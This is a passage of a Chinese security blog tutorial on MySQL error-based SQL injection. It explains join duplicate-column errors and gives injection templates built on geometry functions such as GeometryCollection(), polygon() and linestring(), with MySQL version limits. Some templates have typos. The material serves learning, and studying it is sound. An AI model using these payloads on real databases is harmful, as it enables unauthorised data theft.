+<h3 id="举例-5"><a href="#举例-5" class="headerlink" title="举例"></a>举例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from users a join users b )c;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118114717127.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from users a join users b using(id))c;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118114506181.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from users a join users b using(id,name))c;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118114427936.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from users a join users b using(id,name,password))c;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118113458788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="通过GeometryCollection-报错注入"><a href="#通过GeometryCollection-报错注入" class="headerlink" title="通过GeometryCollection()报错注入"></a>通过GeometryCollection()报错注入</h2><h3 id="函数解释-4"><a href="#函数解释-4" class="headerlink" title="函数解释"></a>函数解释</h3><p>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。对GeometryCollection的元素无任何限制，但下面介绍的GeometryCollection的子类会限制其成员。这类限制可能基于：</p>
+<p>　　元素类型（例如，MultiPoint可能仅包含Point元素）。</p>
+<p>　　维数</p>
+<p>　　对元素间空间交迭程度的限制</p>
+<p>官方文档中举例的用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</span><br></pre></td></tr></table></figure>
+
+<p>POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。</p>
+<p>LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。</p>
+<h3 id="报错原理-6"><a href="#报错原理-6" class="headerlink" title="报错原理"></a>报错原理</h3><p>由于MYSQL无法用这样字符串画出图形,所以报错了</p>
+<h3 id="约束条件-6"><a href="#约束条件-6" class="headerlink" title="约束条件"></a>约束条件</h3><p>5.5&lt;mysql版本&lt;5.6</p>
+<h3 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and geometrycollection((select * from(select * from (操作代码)a)b))</span><br></pre></td></tr></table></figure>
+
+<h3 id="举例-6"><a href="#举例-6" class="headerlink" title="举例"></a>举例</h3><p><img src="https://img-blog.csdnimg.cn/20210118115257625.png" alt="在这里插入图片描述"></p>
+<h2 id="其他函数报错注入"><a href="#其他函数报错注入" class="headerlink" title="其他函数报错注入"></a>其他函数报错注入</h2><p>都为空间数据储存函数，其余函数的报错原理与GeometryCollection()原理相同</p>
+<h3 id="MYSQL-中的空间数据存储"><a href="#MYSQL-中的空间数据存储" class="headerlink" title="MYSQL 中的空间数据存储"></a>MYSQL 中的空间数据存储</h3><p>MySQL支持以下数据类型：</p>
+<p>  Geometry:可以存储所有的几何类型</p>
+<p>  Point:简单点</p>
+<p>  LINESTRING:简单线</p>
+<p>  POLYGON:简单面</p>
+<p>  MULTIPOINT：多点</p>
+<p>  MULITILINESTRING:多线</p>
+<p>  MUILITIPOLYGON：很多方面</p>
+<p>  GEOMETRYCOLLECTION:任何几何集合</p>
+<h3 id="约束条件-7"><a href="#约束条件-7" class="headerlink" title="约束条件"></a>约束条件</h3><p>同geometrycollection()</p>
+<h3 id="通过polygon-报错"><a href="#通过polygon-报错" class="headerlink" title="通过polygon ()报错"></a>通过polygon ()报错</h3><h4 id="注入代码-1"><a href="#注入代码-1" class="headerlink" title="注入代码"></a>注入代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon((select * from(select * from(操作代码)a)b))</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过multipoint-报错"><a href="#通过multipoint-报错" class="headerlink" title="通过multipoint ()报错"></a>通过multipoint ()报错</h3><h4 id="注入代码-2"><a href="#注入代码-2" class="headerlink" title="注入代码"></a>注入代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint((select * from(select * from(操作代码)a)b))</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过multlinestring-报错"><a href="#通过multlinestring-报错" class="headerlink" title="通过multlinestring ()报错"></a>通过multlinestring ()报错</h3><h4 id="注入代码-3"><a href="#注入代码-3" class="headerlink" title="注入代码"></a>注入代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring((select * from (操作代码)a)b))</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过multpolygon-报错"><a href="#通过multpolygon-报错" class="headerlink" title="通过multpolygon ()报错"></a>通过multpolygon ()报错</h3><h4 id="注入代码-4"><a href="#注入代码-4" class="headerlink" title="注入代码"></a>注入代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipolygon((select * from(select * from(操作代码)a)b))</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过linestring-报错"><a href="#通过linestring-报错" class="headerlink" title="通过linestring ()报错"></a>通过linestring ()报错</h3><h4 id="注入代码-5"><a href="#注入代码-5" class="headerlink" title="注入代码"></a>注入代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring((select * from(select * from(操作代码)a)b))</span><br></pre></td></tr></table></figure>
+
+
+
+
+        </div>
+        <footer class="kratos-entry-footer clearfix">
+            <div class="footer-tag clearfix">
+                <div class="pull-date">
+                <span>最后编辑：2021-08-01</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86"><span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E8%AF%AD%E5%8F%A5%E7%9A%84%E7%89%B9%E6%80%A7%E2%80%93%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-text">mysql语句的特性–子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">十二种报错注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A"><span class="toc-text">详细解释</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87floor-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">通过floor()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A"><span class="toc-text">函数解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-1"><span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">注入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87exp-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">通过exp()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A-1"><span class="toc-text">函数解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-2"><span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5-1"><span class="toc-text">注入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-1"><span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ExtractValue-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">通过ExtractValue()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-text">函数解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-3"><span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5-2"><span class="toc-text">注入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-2"><span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87UpdateXml-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">通过UpdateXml()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A%EF%BC%9A-1"><span class="toc-text">函数解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-4"><span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5-3"><span class="toc-text">注入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-3"><span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87NAME-CONST-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">通过NAME_CONST()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A-2"><span class="toc-text">函数解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-5"><span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6-4"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5-4"><span class="toc-text">注入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-4"><span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87join%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">通过join报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A-3"><span class="toc-text">函数解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6-5"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5-5"><span class="toc-text">注入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-5"><span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87GeometryCollection-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">通过GeometryCollection()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A-4"><span class="toc-text">函数解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-6"><span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6-6"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-text">注入代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-6"><span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">其他函数报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-%E4%B8%AD%E7%9A%84%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8"><span class="toc-text">MYSQL 中的空间数据存储</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6-7"><span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87polygon-%E6%8A%A5%E9%94%99"><span class="toc-text">通过polygon ()报错</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81-1"><span class="toc-text">注入代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87multipoint-%E6%8A%A5%E9%94%99"><span class="toc-text">通过multipoint ()报错</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81-2"><span class="toc-text">注入代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87multlinestring-%E6%8A%A5%E9%94%99"><span class="toc-text">通过multlinestring ()报错</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81-3"><span class="toc-text">注入代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87multpolygon-%E6%8A%A5%E9%94%99"><span class="toc-text">通过multpolygon ()报错</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81-4"><span class="toc-text">注入代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87linestring-%E6%8A%A5%E9%94%99"><span class="toc-text">通过linestring ()报错</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81-5"><span class="toc-text">注入代码</span></a></li></ol></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/RCE/">RCE</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%8A%A5%E5%91%8A/">技术报告</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/PHP/" style="font-size: 0.6em;">PHP</a> <a href="/tags/RCE/" style="font-size: 0.7em;">RCE</a> <a href="/tags/SSTI/" style="font-size: 0.6em;">SSTI</a> <a href="/tags/Tomcat/" style="font-size: 0.8em;">Tomcat</a> <a href="/tags/Weblogic/" style="font-size: 0.6em;">Weblogic</a> <a href="/tags/XXE/" style="font-size: 0.6em;">XXE</a> <a href="/tags/Xpath/" style="font-size: 0.6em;">Xpath</a> <a href="/tags/mysql/" style="font-size: 0.6em;">mysql</a> <a href="/tags/python/" style="font-size: 0.6em;">python</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.7em;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.6em;">代码审计</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 0.7em;">报告</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 0.6em;">报错注入</a> <a href="/tags/%E9%85%8D%E7%BD%AE/" style="font-size: 0.8em;">配置</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/07/14/RCE%E6%80%BB%E7%BB%93/"><i class="fa  fa-book"></i> RCE总结</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/06/02/REC(%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="fa  fa-book"></i> REC(远程代码执行漏洞)原理及漏洞利用</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/05/03/Xpath%E5%9F%BA%E7%A1%80/"><i class="fa  fa-book"></i> Xpath基础</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/04/12/SSTI(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="fa  fa-book"></i> SSTI(模板注入)漏洞利用</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 代码审计思路详解</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:ciyaso@163.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Ciyaso"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 Welcome to C1yas0's Blog 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by C1yas0.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
